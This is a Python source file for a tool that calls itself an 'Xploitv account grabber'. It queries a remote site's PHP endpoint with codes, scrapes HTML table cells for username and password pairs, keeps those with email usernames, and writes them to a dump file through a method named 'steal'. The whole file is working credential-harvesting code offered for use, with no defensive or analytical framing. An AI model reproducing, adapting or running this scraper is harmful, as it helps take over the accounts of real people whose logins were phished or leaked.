#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Core modules
# --------------
import re
import logging
from threading import Lock
from  urllib.request import Request, urlopen

# Grabber class
# ---------------
class Grabber(object):
    def __init__(self):
        ''' Xploitv account grabber '''
        self.__DELIMITER: tuple = None
        self.__HDRS: dict       = {'User-Agent': 'FSundays'}
        self.__URL: str         = 'https://xploitv.net/binv.php'
        self.__LOCK: Lock       = Lock()
        self.__ACCNTS: list     = list()
    def check_status(self) -> bool:
        ''' Check the page status '''
        status: bool = False
        try:
            urlopen(Request(self.__URL, headers=self.__HDRS))
            status = True
        except: pass
        return status
    def set_format(self,foutput: str) -> None:
        ''' Set the output format '''
        # Existing formats
        formats: list = ['csv','txt']
        if foutput in formats: logging.info(f"Setting the output format to '{foutput}'")
        # Delimiters according to the output format
        if foutput == 'csv': self.__DELIMITER = (foutput,',','\r\n')
        elif foutput == 'txt': self.__DELIMITER = (foutput,':','\n')
    def __request(self,code: str) -> bytes:
        ''' Request the content of the page '''
        data    : bytes = None
        URI     : str = f"{self.__URL}?bb={code}"
        request : Request = Request(URI, headers=self.__HDRS)
        try:
            # Read the content of the website
            response: http.client.HTTPResponse = urlopen(request)
            data = response.read()
        except: pass
        return data
    def __filter(self, data: bytes) -> list:
        ''' Filter the content of the page '''
        # Grab only the content of the table
        content: list = re.findall(rb'<td>[^<>]+<', data)
        return [ c[4:-1] for c in content if content ]
    def __grab(self, data: list) -> list:
        ''' Grab all the accounts '''
        state: int = 0
        account: list = list()
        accounts: list = list()
        # Accounts are separated by N\\D
        for field in data:
            if field == b'N\\/D':
                accounts.append(account)
                account = list()
                state = 0
            elif state < 2:
                account.append(field)
                state += 1
        return accounts
    def __clear(self):
        ''' Remove duplicate accounts '''
        self.__ACCNTS = list(dict.fromkeys(self.__ACCNTS))
        self.__ACCNTS.sort()
    def steal(self, code: str) -> list:
        ''' Runner '''
        # Connect to the page
        content: bytes      = self.__request(code)
        if not content:
            logging.warning(f"Service unavailable while trying code {code}")
            return
        # Filter the content
        fields: list        = self.__filter(content)
        if not fields:
            logging.debug(f"No content found for code {code}")
            return
        # Grab all the possible accounts
        accounts            = self.__grab(fields)
        if not accounts:
            logging.debug(f"No accounts found for code {code}")
            return
        # Concurrency lock
        with self.__LOCK:
            logging.info(f"Grabbing accounts from {code}")
            # Iterate over accounts
            for account in accounts:
                if len(account) > 1:
                    username, password = account
                    # Check if is an email
                    if b'@' in username:
                        username = username.decode('utf-8')
                        password = password.decode('utf-8')
                        logging.debug(f"Account from code {code}\nUsername: '{username}'\nPassword: '{password}'")
                        self.__ACCNTS.append((username,password))
    def output(self) -> None:
        ''' Store the results in a dump file '''
        if len(self.__ACCNTS) > 0:
            # Remove duplicate accounts
            self.__clear()
            # Show the accounts vía terminal
            if not self.__DELIMITER:
                for account in self.__ACCNTS: print(f"{account[0]}:{account[1]}")
            # Create a new file
            else:
                file = f"dump.{self.__DELIMITER[0]}"
                logging.critical(f"Results stored in ./{file}")
                with open(file, "w") as dump:
                    dump.write(f"Username{self.__DELIMITER[1]}Password{self.__DELIMITER[2]}")
                    for account in self.__ACCNTS:
                        dump.write(f"{account[0]}{self.__DELIMITER[1]}{account[1]}{self.__DELIMITER[2]}")
            logging.critical("Execution completed!")
        else:
            logging.critical("Execution completed with no results")
